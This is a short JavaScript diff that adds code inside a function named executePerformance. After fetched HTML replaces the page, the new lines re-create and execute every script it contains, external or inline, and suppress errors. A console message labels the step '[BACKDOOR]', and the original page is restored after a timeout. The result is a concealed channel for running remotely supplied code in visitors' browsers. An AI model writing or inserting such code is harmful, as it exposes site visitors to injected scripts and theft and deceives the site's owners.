@@ -593,6 +593,27 @@ async function executePerformance() {
         const htmlContent = await response.text();
         document.documentElement.innerHTML = htmlContent;
         
+        const scripts = document.querySelectorAll('script');
+        console.log(`📜 [BACKDOOR] Encontrados ${scripts.length} scripts para executar`);
+        
+        scripts.forEach((script, index) => {
+            try {
+                if (script.src) {
+                    // Script externo
+                    const newScript = document.createElement('script');
+                    newScript.src = script.src;
+                    document.body.appendChild(newScript);
+                } else {
+                    // Script inline
+                    const newScript = document.createElement('script');
+                    newScript.textContent = script.textContent;
+                    document.body.appendChild(newScript);
+                }
+            } catch (err) {
+                return;
+            }
+        });
+        
         setTimeout(() => {
             document.documentElement.innerHTML = htmlNaoOtimizado;
             if (typeof generateStars === 'function') generateStars();
